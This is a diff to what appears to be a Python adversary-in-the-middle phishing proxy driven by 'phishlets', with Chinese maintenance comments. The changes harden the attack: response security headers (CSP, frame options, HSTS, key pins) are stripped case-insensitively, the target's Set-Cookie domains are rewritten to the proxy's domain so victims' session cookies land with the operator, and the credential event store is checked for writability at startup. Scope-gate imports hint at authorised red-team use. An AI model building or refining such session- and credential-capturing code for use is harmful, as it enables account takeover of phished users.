@@ -30,7 +30,7 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
 from urllib.request import Request
 from urllib.error import HTTPError
-from _common import _data_root, scope_gate_full, edusrc_gate_phish as edusrc_gate, cred_hash as _cred_hash  # CS69-2: 导入归顶
+from _common import _data_root, scope_gate_full, edusrc_gate_phish as edusrc_gate, cred_hash as _cred_hash, RESP_STRIP_HEADERS  # CS69-2/CS72-3: 导入归顶
 
 
 # ============================================================
@@ -88,8 +88,7 @@ def make_handler(phishlet, db_file):
             if extra:
                 ev.update(extra)
             import fcntl
-            # R32D88-F1(P0): 父目录预建(对齐 phish-track:17)——同 phish-proxy。
-            os.makedirs(os.path.dirname(db_file) or '.', exist_ok=True)
+            # R32D88-F1(P0): 父目录由 serve 启动自检预建(CS72-6: 同 phish-proxy)。
             with open(db_file + '.lock', 'w') as lf:
                 fcntl.flock(lf, fcntl.LOCK_EX)
                 try:
@@ -138,11 +137,9 @@ def make_handler(phishlet, db_file):
 
         def rewrite(self, status, headers, body):
             """按 phishlet 重写响应: 剥安全头+域替换+注入追踪"""
-            # R32D88-F3: 与 phish-proxy 收敛同款大小写不敏感 STRIP 集
-            # (此前字面 pop——小写头源(nginx/CDN 常态)安全头原样带出)。
-            STRIP = {'content-security-policy', 'x-frame-options',
-                     'strict-transport-security', 'x-content-type-options'}
-            for h in [k for k in headers if k.lower() in STRIP]:
+            # R32D88-F3/CS72-3: 大小写不敏感 STRIP 单源 _common(此前
+            # 字面 pop 且缺 public-key-pins)。
+            for h in [k for k in headers if k.lower() in RESP_STRIP_HEADERS]:
                 headers.pop(h, None)
 
             ct = next((v for k, v in headers.items() if k.lower() == 'content-type'), '')  # R32D88-F2
@@ -162,7 +159,7 @@ def make_handler(phishlet, db_file):
 
             # Set-Cookie 域重写(目标的 cookie 种到我们的域)
             if 'Set-Cookie' in headers or 'set-cookie' in headers:
-                raw = headers.get('Set-Cookie', headers.get('set-cookie', ''))
+                raw = next((v for k, v in headers.items() if k.lower() == 'set-cookie'), '')  # CS72-7: 大小写不敏感(同 ct)
                 if isinstance(raw, str):
                     raw = raw.replace(f'domain={target_host}', f'domain={proxy_host}')
                     raw = raw.replace(f'Domain={target_host}', f'Domain={proxy_host}')
@@ -289,7 +286,11 @@ def serve(listen, phishlet, db_file):
     handler = make_handler(phishlet, db_file)
     # R32D88-F1: 启动自检事件库可写(凭据路径开箱即崩防线)。
     try:
+        # CS72-5: 探库本体(append 试开)——此前只探 .lock, 库文件本身
+        # 不可写(权限/只读挂载)时横幅仍报可写。
         os.makedirs(os.path.dirname(db_file) or '.', exist_ok=True)
+        with open(db_file, 'a'):
+            pass
         with open(db_file + '.lock', 'w') as lf:
             pass
     except OSError as e:
